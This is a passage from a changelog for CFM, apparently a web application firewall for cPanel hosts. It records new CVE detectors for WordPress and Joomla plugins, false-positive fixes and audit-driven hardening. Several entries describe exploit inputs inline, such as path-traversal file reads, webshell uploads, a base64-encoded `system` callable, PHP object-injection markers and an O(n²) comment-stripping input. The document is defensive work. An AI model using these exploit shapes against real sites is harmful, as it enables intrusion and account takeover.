# Changelog

All notable changes to CFM are recorded here.

**Versioning is date-based: the version *is* the release date** (`YYYY.MM.DD`,
from `date +%Y.%m.%d` in the Makefile). Each released `.deb`/`.rpm` produced by
`make release` carries that day's date, so every dated heading below
corresponds to a real package that was built and `make sync`'d out.

Format loosely follows [Keep a Changelog](https://keepachangelog.com/):
group entries under **Added / Changed / Fixed / Security / Removed**. Work in
progress accumulates under **[Unreleased]**; on release day it moves under a
new `## YYYY.MM.DD` heading (see CLAUDE.md → "Releasing & CHANGELOG").

History before this file (the first ~1000 PRs, Mar–Jun 2026) is not
back-filled here — see the git/PR history for that period.

## [Unreleased]

### Fixed
- **WAF CRLF (rule 605): stop flagging `Content-Type`/`Content-Length` in
  request *bodies*.** A logged-in admin's page-builder `wp-admin/admin-ajax.php`
  save POST — whose payload legitimately embeds a `\r\nContent-Type:` line
  (oEmbed/email/template HTML) — tripped `WAF_CRLF:CRLF_CONTENT_TYPE` (logonly,
  so only log noise, but a confirmed false positive). The #1109 fix only scoped
  those two tags to the args surface for *multipart* requests; this generalises
  it to **all** requests: `content-type`/`content-length` are matched in the
  query string only (raw and URL-encoded), because a request-body value is
  essentially never reflected into a *response* `Content-Type`/`Length` header.
  The high-impact response-splitting headers `Set-Cookie`/`Location` stay
  full-surface (args+body) and still fire from a body. Removes the request
  Content-Type header inspection entirely (subsumes the multipart carve-out).

### Added
- **WAF CVE detector: Multi Uploader for Gravity Forms unauth upload → RCE
  (rule 10010, CVE-2025-23921).** The Multi Uploader for Gravity Forms plugin
  (`<= 1.1.3`, CVSS 9.0, actively exploited since Aug 2024) has an
  unauthenticated arbitrary file upload: a multipart POST to the `gf_page=upload`
  endpoint whose `gform_unique_id` field — normally a UUID — is set to a
  path-traversal destination ending in a php-executable extension
  (`../../../…/shell.phtml`), writing a webshell outside the intended upload
  dir. This is a **genuine gap over rule 401**: the php-exec extension rides in
  the `gform_unique_id` *field value* (the traversal destination), not the
  multipart `filename=`, so 401's filename matcher never sees it. The detector
  extracts the `gform_unique_id` value and requires **both** traversal **and** a
  php-exec extension in it, so a legit upload whose file *content* happens to
  contain `../`/`.phtml` can't false-positive (a real `gform_unique_id` is a bare
  UUID). `WAF_CVE` armed → first probe 403s + nft-bans. Reason
  `WAF_CVE:CVE_2025_23921:GF_MULTI_UPLOADER:TRAVERSAL_PHTML`. Positive+negative
  Lua tests. Shape confirmed against WPScan/Wordfence/Patchstack + operator
  threat-intel, not memory.
- **WAF rule 329: unauthenticated PHP object injection → armed block
  (`WAF_RCE:PHP_OBJECT_INJECTION`).** Closes the ~153-site deserialization-RCE
  exposure (kirki/jet-engine/woodmart/better-search-replace/fusion …) without a
  per-plugin endpoint list. Fires on a PHP serialized OBJECT marker
  (`O:N:"…"`/`C:N:"…"` — not `a:N:` arrays, which are common/benign) in an
  **unauthenticated** request, in **args OR body**, including **base64**-encoded
  payloads. Emits `WAF_RCE` (already armed by default) so a hit 403s + nft-bans.
  This is deliberately stronger than rule 306 (`WAF_SERIALIZE`, challenge,
  **args-only**) and closes rule 304's logonly `B64_OBJ_INJECT` gap — but only
  for unauthenticated requests: legit serialized blobs (WooCommerce/Elementor/
  WPML) ride authenticated admin-ajax and carry the WP logged-in cookie, so the
  unauth gate keeps FP near-zero, and rule 306 still handles the authenticated
  case at challenge. Positive+negative Lua tests (authenticated marker,
  serialized arrays, and benign `o:N`-looking text stay clean).
- **WAF CVE detector: Kirki unauth account takeover (rule 10009,
  CVE-2026-8206).** Kirki (`<= 6.0.6`, CVSS 9.8, actively mass-exploited) exposes
  an unauthenticated REST endpoint
  `POST /wp-json/KirkiComponentLibrary/v1/kirki-forgot-password` whose
  `handle_forgot_password()` accepts a `username` and an `email` independently
  without checking the email belongs to that user — so an attacker requests a
  reset for any admin username, supplies their own email, and receives the reset
  link → full account takeover. The detector keys on the endpoint + both
  `username` and `email` (both are required for the exploit; a single-field
  legitimate reset is let through — strictly fewer FPs than blocking the bare
  endpoint, and Kirki is typically a bundled theme dependency so the endpoint
  sees ~zero legit traffic anyway). `WAF_CVE` armed → first probe 403s +
  nft-bans. Reason `WAF_CVE:CVE_2026_8206:KIRKI:FORGOT_PASSWORD`. Positive+negative
  Lua tests. Endpoint/params confirmed against WPScan / the public PoC, not
  memory.
- **WAF CVE detector: Avada / Fusion Builder unauth RCE + file delete (rule
  10008, CVE-2026-6279 + CVE-2026-8713).** Rule group R4 from the fleet scan;
  completes the "block now" net-new set. Two unauth `admin-ajax.php` nopriv
  legs: (A) `action=fusion_get_widget_markup` with a base64 `render_logics`
  param that decodes to `{"type":"wp_conditional_tags","value":{"function":
  "system",…}}` — the `function` value reaches `call_user_func()` with no
  allowlist (RCE, CVE-2026-6279). The detector decodes `render_logics` and flags
  a dangerous callable (a legitimate `wp_conditional_tags` only calls `is_*` WP
  conditional tags). (B) `action=fusion_form_submit_ajax` +
  `privacy_expiration_action` — a server-side-only field a client never sends,
  which triggers `maybe_delete_files()` on an attacker-controlled path (delete
  `wp-config.php` → takeover; CVE-2026-8713). `WAF_CVE` armed → first probe
  403s + nft-bans. Reasons `WAF_CVE:CVE_2026_6279:FUSION_BUILDER:RCE` /
  `WAF_CVE:CVE_2026_8713:FUSION_BUILDER:FILE_DELETE`. Positive+negative Lua
  tests (legit `is_front_page` render logic and a normal form submission stay
  clean). Shapes confirmed against the CVE-2026-6279 PoC / WPScan, not memory.
- **WAF CVE detector: Post SMTP unauth email-log disclosure (rule 10007,
  CVE-2025-11833 + CVE-2023-6875).** Rule group R7 from the fleet scan. A
  missing capability check lets an unauthenticated caller read the plugin's
  email logs — including password-reset links — and take over admin (the fleet's
  "mass-mailer pivot": post-smtp is an SMTP relay, so takeover yields working
  outbound mail creds). Blocks UNAUTH requests to the plugin's REST namespace
  `/wp-json/post-smtp/` (the `v1/get-log(s)` / `v1/connect-app` endpoints) or the
  `postman_email_log` admin page. UNAUTH-gated on the absence of a
  `wordpress_logged_in_*` cookie, so a real admin (and the plugin's own admin-UI
  AJAX) is exempt while the exploit is blocked. `WAF_CVE` armed → first probe
  403s + nft-bans. Reason `WAF_CVE:CVE_2025_11833:POST_SMTP:{REST,EMAIL_LOG}`.
  Positive+negative Lua tests (logged-in admin, other REST namespaces, and
  non-postman admin pages stay clean). Endpoints confirmed against WPScan /
  ZeroPath / NVD, not memory.
- **WAF CVE detector: W3 Total Cache mfunc RCE surface (rule 10006,
  CVE-2026-5032 + CVE-2025-9501).** Highest-exposure item on the fleet scan
  (51 sites; rule group R1). Two unauth legs: (A) a `User-Agent` containing
  `W3 Total Cache` — which bypasses W3TC's output buffering and leaks the
  `W3TC_DYNAMIC_SECURITY` token needed to sign an mfunc payload (CVE-2026-5032;
  nothing legitimate sends that UA, zero FP), all methods; and (B) a
  `mfunc`/`mclude` dynamic-fragment marker in a POST to `wp-comments-post.php`
  or `/wp-json/wp/v2/comments` — the tag W3TC `eval()`s on cached render
  (CVE-2025-9501). Per the fleet spec, the marker is matched as a **substring**
  (not the exact `<!--mfunc …-->` tag form — three vendor fixes were bypassed by
  nesting), scoped to the comment endpoints; `dynamic_cache` is deliberately not
  matched (higher FP, not the eval tag). `WAF_CVE` is armed → first probe 403s +
  nft-bans. Reasons `WAF_CVE:CVE_2026_5032:W3TC:UA_TOKEN_LEAK` /
  `WAF_CVE:CVE_2025_9501:W3TC:MFUNC`. Positive+negative Lua tests. Shapes
  confirmed against WPScan / rcesecurity.com, not memory.
- **WAF CVE detector: Slider Revolution virtual-patch (rule 10005,
  CVE-2015-1579 + classic upload RCE).** A behavioural (shape-based) rule, not a
  version match: blocks the two classic UNAUTH revslider exploit shapes on ANY
  version — (A) `admin-ajax.php?action=revslider_show_image&img=../wp-config.php`
  arbitrary file read (CVE-2015-1579), and (B) `action=revslider_ajax_action` +
  `client_action=update_plugin` arbitrary plugin/ZIP upload → RCE (the Metasploit
  `wp_revslider_upload_execute` vector). Leg B is gated on UNAUTH (no
  `wordpress_logged_in_*` cookie) since `update_plugin` is a real admin action.
  Fills a genuine gap — a revslider `update_plugin` ZIP-with-PHP upload is not
  caught by the generic upload rules (401 sees only the outer `.zip`; 414 is
  Joomla-scoped). Runs before the generic traversal rule so the CVE attribution
  wins. `WAF_CVE` is armed → first probe 403s + nft-bans the scanner. Reasons:
  `WAF_CVE:CVE_2015_1579:REVSLIDER:LFI` / `WAF_CVE:REVSLIDER:PLUGIN_UPLOAD`.
  Positive+negative Lua tests (legit `get_slider_html`, authed-admin
  `update_plugin`, and non-traversal `img` stay clean).
- **WAF CVE detector: LiteSpeed Cache privilege escalation (rule 10004,
  CVE-2024-28000).** Detects the unauthenticated privesc in LiteSpeed Cache
  `< 6.4` (30 sites on the fleet): the crawler role-simulation validates a weak
  6-char hash (~1M values) from a `litespeed_hash` cookie, so an attacker
  brute-forces it to be simulated as admin. Keyed on the presence of a
  `litespeed_hash`/`litespeed_role` **cookie** — an internal mechanism a real
  visitor never sets (zero FP per Wordfence/Patchstack), matched at the cookie
  name boundary so a value substring can't trip it. Runs on **all methods**
  (the brute-force is a GET to the REST API), not just POST. `WAF_CVE` is armed,
  so the **first** guessed-hash request 403s AND nft-bans the source — killing
  the ~1M-request brute-force after a single attempt, and alerting as
  `WAF/CVE-2024-28000`. First detector from the operator's fleet-scan worklist
  (rule group R6). Positive+negative Lua tests (incl. legit `_lscache_vary` and
  WP session cookies stay clean); Lua↔Go id parity kept.
- **WAF CVE detector: Ninja Forms File Uploads RCE (rule 10003,
  CVE-2026-0740).** Detects the unauthenticated arbitrary-file-upload +
  path-traversal exploit in the Ninja Forms "File Uploads" add-on that the
  July-2026 ACSC CMS campaign probes: `POST /wp-admin/admin-ajax.php` with the
  add-on action `nf_fu_upload` plus an exploit marker — a php-executable upload
  filename, or path traversal in the `image_jpg` destination param
  (`../../../`). Keyed on the SPECIFIC action (a bare `admin-ajax.php` match is
  deliberately not enough — form submissions are common), so a legitimate
  Ninja Forms upload (image/pdf, normal dest) does not fire. `WAF_CVE` is armed,
  so a hit `403`s + 6h-nft-bans + Slack/mails as `WAF/CVE-2026-0740`. Runs
  before the generic upload rules so the CVE reason wins attribution.
  Positive+negative Lua tests (both exploit legs); Lua↔Go id parity kept.
- **WAF CVE detector: Joomla JCE profile-import RCE (rule 10002,
  CVE-2026-48907).** Detects the unauthenticated arbitrary-PHP-upload exploit in
  Joomla's JCE extension (`< 2.9.99.5`) that the July-2026 ACSC CMS campaign
  probes (CISA KEV): `POST /index.php?option=com_jce` with the `profiles.import`
  action and a php-executable file in the multipart upload (double-extension
  `.xml.php`). Keyed on the component (`com_jce`) + action value
  (`profiles.import`) + a php-exec upload filename — matched as value substrings
  so it survives the PoC's all-multipart encoding, and reusing the hardened
  rule-401 filename matcher for the multipart-CT gate and double-extension
  coverage. Near-zero FP (a legit profile import ships `.xml`/`.zip`, never
  `.php`) → ships at `block`; runs before the generic upload rules so the
  `WAF/CVE-2026-48907` reason wins attribution. `WAF_CVE` is armed, so a hit
  6h-nft-bans + Slack/mails. Positive+negative Lua tests; Lua↔Go id parity kept.
- **First WAF CVE detector: Simple File List upload→rename RCE (rule 10001,
  CVE-2025-34085 / CVE-2020-36847).** Detects the WordPress Simple File List
  exploit the July-2026 ACSC CMS campaign probes: a PHP payload uploaded as an
  image to `…/simple-file-list/ee-upload-engine.php`, then renamed to a
  php-executable extension via `…/ee-file-engine.php`. Keyed on the endpoint plus
  an exec-extension/`<?php` marker (not the volatile PoC parameter names), so one
  detector covers both CVEs; near-zero FP → ships at `block`. This also lays the
  reusable **WAF_CVE** framework foothold from WAF_CVE_PLAN.md: named-vulnerability
  rules use the new `10000+` ID band (Lua↔Go parity + grouping tests updated), and
  the `waf_security` autoblock notification now surfaces the concrete CVE —
  `WAF/CVE-2025-34085` with the `rule_id` and a `cve` Extra field — instead of a
  generic `WAF/CVE`. **Autoblock:** `WAF_CVE` is armed by default (`CVE = 1`, like
  the other block-tier families) so a Simple File List hit gets a 6h nft ban AND a
  `WAF/CVE-2025-34085` Slack/mail alert — an un-armed family notifies nothing. The
  family is heterogeneous, so a lower-confidence CVE rule ships with a per-rule
  `RULE_<id> = 0` (hold the rule, not the family); `DRY_RUN = 1` gives a
  watch-first burn-in. GR/CY leniency applies. `go test`/`vet`/`build`,
  `make lua`/`test-lua` green.
- **`WAF_CVE.md` — as-built reference + "CVE hunting" workflow.** Documents the
  live CVE framework (10000+ id band, `WAF_CVE` family, CVE-named
  notifications, the un-armed-by-default autoblock safety, the Simple File List
  detector, and the ACSC candidate status) plus a step-by-step recipe for
  adding the next CVE detector. CLAUDE.md §6 gets a `WAF_CVE` subsection and a
  §7 docs-table pointer, so future CVE work starts from the checklist instead
  of relearning it.

### Fixed
- **cfm-lsm: silence OBS-004 ptrace-telemetry noise from cPanel/CloudLinux
  control-plane.** `CFML-OBS-004` (ptrace by a web-class uid, monitor-only)
  fires whenever a watched uid reads its own process tree via /proc — reading
  `/proc/<pid>/{stat,exe}` routes through `ptrace_may_access`, so cPanel's
  jailshell/PHP `ps` calls and the cPanel/CloudLinux API machinery (`cpanel`
  → `cpapi2`, `uapi`, `cloudlinux-cli-user.py`, `lve_suwrapper`) generate the
  bulk of OBS-004 events. All are same-uid, not cross-tenant. Added those comms
  to the `CFML-OBS-004` `allow_comm` list in the reference `configs/lsm.conf`
  (scoped to this policy, NOT global: `allow_comm` matches the spoofable
  `task->comm`, so a global entry would also exempt the names from CRED-002 /
  CRED-004 / EXEC-003 — keeping them per-policy limits the blind spot to ptrace
  telemetry). `lsphp` is deliberately excluded (a PHP worker ptracing a sibling
  is the exact threat OBS-004 exists to surface). Noise reduction only; the
  block layer remains kernsec `yama.ptrace_scope=2`.
- **cfm-lsm: silence CRED-002 false positives from stock cPanel/cron daemons.**
  `CFML-CRED-002` (privilege escalation without a setuid path, monitor-only)
  fires when a task transitions uid→0 via a setuid-family syscall from a binary
  that carries no `S_ISUID` bit and is not allowlisted. On stock cPanel hosts
  three root-started system daemons legitimately do exactly that and were
  generating recurring noise: `crond` (re-credentialing per-user cron jobs),
  `pkgacct` (account backup/transfer), and `process_ssl_reissue` (AutoSSL). None
  are web-origin. Added them to the `CFML-CRED-002` `allow_exe` list in the
  reference `configs/lsm.conf` (these paths are also stat()'d into the BPF-side
  `cfm_setuid_inodes` map, so they gate the kernel decision, not just the
  userspace post-filter). The cPanel Perl taskqueue is deliberately left out —
  its exe is the generic `perl` interpreter. Operators pull this in by syncing
  the reference config (or adding the three `allow_exe` lines to
  `/etc/cfm/lsm.conf`) and running `cfm lsm restart`.
- **WAF CRLF rule (605) no longer flags legit multipart uploads.** A
  `multipart/form-data` body carries a per-part `Content-Type:` (and sometimes
  `Content-Length:`) MIME header on its own `\r\n`-terminated line for every
  file/typed part, so the raw `[\r\n]…content-type:` match in
  `detect_crlf_injection` tripped `WAF_CRLF:CRLF_CONTENT_TYPE` on essentially
  every legitimate upload — webmail (roundcube attachment compose), WordPress
  `wp-admin/async-upload.php` / Elementor, OpenCart filemanager, TYPO3 — a
  structural false positive (rule 605 was held at `logonly` precisely because of
  it). The content-type/content-length match — **both** the raw and the
  URL-encoded branch, since the framing's `\r\nContent-Type:` survives
  url-decoding — is now scoped to the ARGS surface when the request body is
  `multipart/form-data` (those header names can appear legitimately in a
  multipart body but never in the query string); Set-Cookie / Location stay
  full-surface, so detection of the impactful response-splitting vectors is
  unchanged. The request Content-Type is read via `header_string()` so a
  duplicated header (delivered as a table) can't crash the detector. Kept at
  `logonly` pending a fresh burn-in of the carve-out before promoting back to
  `challenge`. Covered by `scripts/tests/cfm_waf_crlf_multipart_test.lua`.

### Changed
- **Traffic-rules throttle no longer over-429s shared/NAT IPs (F21).** The
  `rule_action=throttle` limiter took a per-(profile,host,ip) spin-lock around a
  token bucket, and on lock-acquisition timeout returned a 429 regardless of
  remaining budget. Under carrier-grade NAT or a shared proxy, many legitimate
  users behind one IP contend on that single lock, so lock-losers were 429'd with
  budget to spare — a false positive. It is now a lock-free fixed-window counter
  (one atomic `incr` per request, keyed per profile/host/window/IP): with no lock
  there is no contention to mis-handle, so a legitimate burst is admitted up to
  the profile's limit exactly. The per-profile rate/limit is preserved (soft_bot
  20 per 10 s = 2/s + burst 20, medium 10/10 s, hard 5/10 s); a window boundary
  can momentarily admit up to ~2×, fine for a coarse bot throttle. `incr` failure
  now fails open (admit), matching the existing missing-dict policy. Force-unblock
  still clears throttle state (the IP stays the key's last field). Not addressed:
  a shared NAT IP still shares one budget across its users (a deeper keying
  question the finding raises). Found by the 2026-07 edge Lua audit (F21, medium).
- **Dashboard stats no longer scan the hot shared dicts on every poll (F20).**
  `/cfm-admin/lua-stats` computed its key-count breakdowns with `get_keys(25000)`
  on `cfm_decisions` and `get_keys(8000)` on `sslcache` on every poll. `get_keys`
  locks the whole dict for the scan, so an auto-refreshing dashboard stalled
  request processing (cfm_decisions is read on every request) and TLS handshakes
  (sslcache) box-wide. Those scan-derived counts are now cached per worker for a
  short TTL (~10 s), so the scan runs at most once per interval rather than once
  per poll; all the live fields (capacity/used %, exclude lists, cert counts,
  timestamps, ingest-lock state) are still computed fresh each request. The stats
  output is unchanged. Found by the 2026-07 edge Lua audit (F20, medium).
- **UA-emergency throttle is now a lock-free fixed-window counter (F22).** The
  operator-flagged-UA throttle was a per-UA spin-lock + token bucket on the shared
  `cfm_decisions` dict (an `add`-lock + up to 10×`sleep(1ms)` + `get` + `set` +
  `delete` per request). Under the bot wave it targets — thousands of req/s of one
  UA — that thundered on a single lock and churned the hot decision dict, slowing
  unrelated requests' decision lookups. It now does ONE atomic `incr` per request
  in its own dedicated `cfm_ua_throttle` dict: no lock, no sleep, no
  read-modify-write, and no contention with the decision cache. The cap is
  unchanged in intent — 20 requests per 2 s window = 10/s box-wide per UA with a
  burst of 20; the algorithm change means a window boundary can momentarily admit
  up to ~2× before it resets, which is fine for a coarse emergency cap. The 429 +
  `Retry-After` behavior and the fail-open-by-default / `fail_closed` policy are
  unchanged. Adds one 4 MB shared dict (declared in both `openresty.conf` and
  `angie.conf`). Found by the 2026-07 edge Lua audit (F22, medium).

### Fixed
- **sslcollector socket now actually self-heals (F28 wiring gap).** The F28 fix
  gave the SSL-collector unix-socket server a generation-guarded respawn with
  exponential backoff, but that machinery was only ever driven by
  `SockLifecycle.ApplyConfig`, which the daemon re-invokes **only on a `cfm.conf`
  content change** — never on the periodic tick (unlike `lsmLc.ApplyConfig`). So a
  socket that died mid-life, or failed its **boot-time bind** (stale socket file,
  parent dir not yet ready, `EADDRINUSE` after an unclean restart), stayed down
  until an operator edited `cfm.conf` or restarted the daemon — degrading cert
  delivery to the edge (SNI→cert) with no auto-recovery, i.e. the original F28 bug
  largely surviving. Added a lightweight `SockLifecycle.Tick(ctx)` that drives only
  the respawn state machine (no token re-validation or lua-token rewrite, so **no
  new per-tick file I/O**) and wired it into the daemon tick loop next to
  `lsmLc.ApplyConfig`. A dead server is now restarted within one tick, rate-bounded
  by the existing backoff; healthy/disabled/stopped ticks are cheap no-ops. Not on
  the request hot path (availability of TLS cert delivery, not request blocking).
  Found by the multi-agent re-verification of the 2026-07 edge Lua audit.
- **log-cfm ingest backoff is no longer dead code (declare `cfm_metrics`).** The
  edge's request-log shipper (`log-cfm.lua`) has connect-backoff + first-3-failures
  logging keyed on a `lua_shared_dict cfm_metrics` that was never declared in any
  nginx config — so the whole subsystem silently no-op'd: when the ingest socket
  was degraded, every request spawned an unthrottled connect attempt and the
  failures were 100% silent. Declaring the dict (1 MB, in both `openresty.conf`
  and `angie.conf`) re-enables the intended exponential backoff (0.1→5 s) and the
  connect-failure warnings. Log shipping is deferred off the log phase either way,
  so this never affected request latency. Found by the 2026-07 edge Lua audit
  round-2 triage.

### Security
- **Geo lookup failures are no longer cached as a country (F25, part 2).** The
  edge GeoIP layer returned `""` both for a genuine "no country for this IP" and
  for every failure mode (geo disabled, DB open/init failed, mid retry-cooldown,
  per-lookup error), and cached that `""` — so a transient mmdb hiccup (e.g. the
  `.mmdb` caught mid atomic-rename during a MaxMind update) pinned an IP's country
  as empty for the whole cache TTL. Since `""` is fail-closed for country
  *allowlists*, a poisoned IP could be wrongly challenged/blocked for that window.
  `cfm_geo.country()` now reports whether the lookup actually resolved, and only
  resolved answers (a real code, or a definitive "no country") are cached; a
  transient failure still returns `""` fail-open but is retried on the next
  request (the module's own retry cooldown bounds any lookup storm). Completes
  F25 from the 2026-07 edge Lua audit (medium).
- **Geo country cache moved to its own shared dict (F25, part 1).** The edge
  cached per-IP GeoIP country codes in `cfm_decisions` — the hot dict that also
  holds the decision cache and the abuse counters (throttle buckets, ua_emergency
  state, waf-push dedup) — at a 300 s TTL. Under a high-distinct-IP flood the
  one-entry-per-IP geo writes could LRU-evict the 90 s decision allows and those
  counters, silently weakening rate/abuse protection during exactly the flood the
  decision cache exists to shed. Geo now lives in a dedicated
  `lua_shared_dict cfm_geocache 16m` at a 90 s TTL, so its eviction pressure no
  longer touches the security state. Adds one 16 MB shared dict (declared in both
  `openresty.conf` and `angie.conf`); force-unblock clears the geo key with a
  direct delete from the new dict, and its `used_pct` is surfaced in the admin
  stats alongside the decision dict. No change to the country value the rule
  engine sees. Found by the 2026-07 edge Lua audit (F25, medium); the
  transient-failure-caching half is a follow-up.
- **Bridge decision server sets read/write/idle timeouts (F51).** The
  nginx-bridge `http.Server` had only `ReadHeaderTimeout` set, so a caller holding
  the socket token could send valid headers and then trickle the body to pin a
  goroutine indefinitely (goroutine-per-connection, no upper bound). It now sets
  `ReadTimeout=15s`, `WriteTimeout=15s` and `IdleTimeout=75s`. The values are
  deliberately generous so a deadline can only ever fire on a misbehaving
  connection, never on the real edge — which times *itself* out at ~300 ms per
  RPC, ~50× sooner. `IdleTimeout` is set explicitly (Go otherwise reuses
  `ReadTimeout` as the idle timeout) and sits above the edge's 60 s keepalive
  idle, so pooled connections are never reaped mid-pool. Together with the F49
  body caps this closes the slow-body pin. Local, token-gated socket, so a
  robustness gap rather than a remote DoS; this was the last DoS finding of the
  2026-07 edge Lua audit (F51, low).
- **Bridge POST handlers bound their request bodies (F49).** Five nginx-bridge
  handlers (`ip` push/clear, `vhost` push/clear, `waf/stats`) decoded the request
  body with no size limit, so a compromised or buggy edge worker holding the
  socket token could stream a huge body and spike daemon RSS — worst on
  `waf/stats`, which fanned out one persistence hook per decoded row. Each now
  wraps the body in `http.MaxBytesReader` with a generous, hardcoded cap sized
  above any legitimate push (256 KB for `ip` push, which carries untruncated
  per-request forensic fields — uri/ua/referer/content-type — so even a
  padded-URI attack we *want* to autoblock is never rejected; 4 KB for the tiny
  clear/vhost messages; 2 MB for the `waf/stats` batch), and `waf/stats`
  additionally caps its per-push fan-out at 8192 rows (far above the edge's own
  `get_keys(2000)` snapshot). To keep the `waf/stats` cap from ever rejecting a
  *legitimate* flush, the edge also clamps each row's host to the DNS maximum
  (253 octets) at the bucket source — otherwise a client sending padded `Host:`
  headers to a catch-all vhost could inflate a flush past 2 MB and get the whole
  batch (including co-resident legitimate rows) dropped. Local, token-gated
  socket, so a robustness gap rather than a remote DoS. Found by the 2026-07
  edge Lua audit (F49, low).
- **Ingest socket bounds concurrent connections (F52).** The webdetector ingest
  socket's accept loop spawned one goroutine (+ a 256 KB read buffer) per
  connection with no ceiling, so a cfm-group peer could open many and pin
  memory/goroutines. It now caps concurrent connections at 1024 (a generous,
  hardcoded ceiling sized over the realistic peak — the Lua sender keeps a
  per-worker keepalive pool, so the peak is workers × pool-depth, not one per
  worker — bounding worst-case ingest-buffer memory to ~256 MB) and refuses the
  excess with a throttled log. The refusal is graceful and self-healing: the
  server accepts-then-closes, so the sender's connect still succeeds (no backoff)
  and only that one log line is dropped before it retries. Found by the 2026-07
  edge Lua audit (F52, low).
- **Panel challenge scope is derived from the trusted listener port, not client
  headers (F41).** `cfm_panel.lua` computed the per-port challenge scope from
  `X-CFM-Panel-Port` / `X-Forwarded-Port` with priority over the trusted
  `$cfm_panel_origin` port. On the main panel request those headers are client
  input, so a clearance solved on one panel port could be **replayed on another
  listener** — e.g. present a `panel:2083` clearance on the WHM 2087 listener with
  `X-CFM-Panel-Port: 2083` and skip the 2087 challenge — voiding the per-port
  isolation the scope exists for (not privilege escalation; the user already holds
  a valid clearance). The scope now follows the trusted per-listener
  `$cfm_panel_origin` port and the client headers are ignored. cfm_panel.lua only
  runs on the main external request (the `/__cfm_*` sub-locations, which carry the
  listener-injected trusted header, return early), and each listener's
  `$cfm_panel_origin` port matches the `X-CFM-Panel-Port` the Go challenge server
  mints the scope from — so mint and validate stay in agreement. Found by the
  2026-07 edge Lua audit (F41, low).
- **Bridge token rotation no longer opens a fail-open window (F45).** The edge
  serves the bridge auth token from a 10s cache, so after the daemon rotates it
  (weak-token replacement at startup) the edge kept presenting the stale token
  for up to 10s → the bridge 403'd every decision RPC → `get_decision` fell to
  `fail_decision` (fail-open by default), bypassing IP/vhost/rule blocks and
  challenges for that window. Now a bridge **403** on a token-bearing request
  force-refreshes the token once (new `cfm_bridge_cfg.refresh_token_throttled`)
  and — only if the token actually **changed** — retries the RPC with the fresh
  token before failing open, so a rotation converges on the first 403 per worker
  instead of after the TTL. A persistent 403 from a genuinely wrong token can't
  amplify: the retry is skipped when the refreshed token is unchanged, and the
  file re-read is throttled to once/2s per worker. No change to the Go token-auth
  path. Found by the 2026-07 edge Lua audit (F45, low).
- **X-Forwarded-Proto is only honored from a trusted proxy now (F44).** The
  `$cf_xfp` map forwarded a client-supplied `X-Forwarded-Proto` to origin
  verbatim, with no trusted-proxy gate. In DNAT-direct deployments (no
  Cloudflare) a direct attacker on the plaintext `:9080` listener could send
  `X-Forwarded-Proto: https` and make the backend believe the request was
  secure — bypassing app HTTP→HTTPS enforcement and enabling secure-cookie
  issuance over cleartext. The header is now honored **only when the request
  arrived through a trusted proxy**, else the origin gets the real `$scheme`.
  Trust is derived from the realip module's own decision (`$remote_addr !=
  $realip_remote_addr` ⇔ the peer is in `set_real_ip_from`/`trusted_proxies.conf`),
  so there's no second copy of the Cloudflare range list to drift, and a direct
  attacker cannot forge it (realip won't rewrite for an untrusted peer — a forged
  `CF-Connecting-IP` doesn't help). The gate fails safe: a malformed/empty peer
  address and any non-`http`/`https` value both fall back to `$scheme`.
  Cloudflare Full-SSL is unaffected (already `https`); Flexible-SSL still gets the
  honored header. Mirrored in both `openresty.conf` and `angie.conf`; the `cfm`
  access log gained `xfp_trust=$xfp_trusted_peer`. Found by the 2026-07 edge Lua
  audit (F44, low).
- **WAF URI+query scan caps the path and query independently, closing a
  padding bypass (F30).** The traversal/RCE/XSS/SQLi scan surface was built with
  one combined cap — `normalize(cap(uri.."?"..args, 2048))` — so an attacker
  could prepend ~2KB of benign query bytes to push `../`, a `${jndi:` marker, or
  a UNION payload past byte 2048 before any detector ran, and a path ≥2048 bytes
  evicted the query string from the scan entirely. `scan_str` now caps the URI
  and the query **independently**, each to a new `uri_scan_len` budget (8192, the
  urlencoded POST-body budget), so neither side can evict the other and each is
  scanned to 8KB regardless of the other's length. These detectors already scan
  POST bodies to this depth, so there's no new false-positive class, and a normal
  short URI pays nothing (the cap only bounds; work scales with actual length).
  The window is deliberately **not** raised to the full 64KB request-line ceiling
  (`large_client_header_buffers 8 64k`): a >8KB query can still evade — an
  anomalous, higher bar than the old 2KB — and `uri_scan_len` is a config knob if
  fuller coverage is wanted. Safe to widen past 2048 only because F62 made the
  SQL-comment stripper O(n). Found by the 2026-07 edge Lua audit (F30, low).
- **WAF SQL-comment stripper is no longer a CPU-DoS amplifier (F62).**
  `strip_sql_comments` removed `/* … */` comments with a `/%*.-%*/` gsub whose
  lazy `.-` was **O(n²)** on crafted input with many `/*` starts and no closing
  `*/` (e.g. a query string `?x=/*a/*a/*a…`). It runs on the attacker-controlled
  URI+query scan surface and — with the stock `detectors.conf` — up to **3× per
  request** (the SQLi, SQLi-blind-lexical and SQLi-union-variant rules), so any
  client with a query string could burn Lua CPU on the WAF hot path: measured
  ~5 ms/call at the 2048 scan cap and quadratic beyond it (~85 ms at 8 KB,
  ~5.4 s at a 64 KB request line — and `large_client_header_buffers 8 64k` allows
  that). Block-comment removal is now a single-pass **O(n)** scan (find `/*`, jump
  to the next `*/`, repeat; an unterminated `/*` is kept verbatim), byte-for-byte
  identical to the old stripper (fuzz-verified over 20 000 inputs against the
  original). After: ~0.02 ms at 2 KB, ~0.6 ms at 64 KB (~230–8800× faster), and
  the common no-comment request skips the pass entirely. Found while verifying the
  F30 scan-window finding (whose fix is parked until this landed). Rule detection
  behaviour is unchanged. Found by the 2026-07 edge Lua audit (F62, low).
- **WAF smuggling detector now sees duplicate Content-Length / Transfer-Encoding
  header lines (F37).** `detect_smuggling_cl` (rule 608 `WAF_HTTP_SMUGGLING`,
  challenge) derived its `cl`/`te` values via `header_string()`, which collapses a
  duplicate-header array to its first element. But `ngx.req.get_headers()` returns
  duplicate header lines as a Lua **array** (`{"5","10"}`), not a comma-joined
  string, so the comma-based `MULTI_CL`/`MULTI_TE` checks never saw the second
  value — two `Content-Length` (or two `Transfer-Encoding`) lines were silently
  missed. Added a `type(...)=='table'` guard that flags the duplicate directly
  (mirroring `detect_range_abuse`'s `MULTI_RANGE_HEADER`), while keeping
  `CL_AND_TE` as the top-priority signal. The misleading "nginx joins duplicates
  with ', '" comment is corrected. (nginx often pre-rejects duplicate
  Content-Length, so the practical exposure was limited, but the two detectors
  were inconsistent and the comment was wrong.) Found by the 2026-07 edge Lua
  audit (F37, low).
- **WAF XSS detector now tolerates whitespace before `=` and covers many more
  event handlers (F33).** `detect_xss` (rule 302 `WAF_XSS`, challenge) checked
  only four handlers and required the name immediately followed by `=`
  (`onload=`), so an HTML-legal `onload =` / `onload\t=` (attribute parsers accept
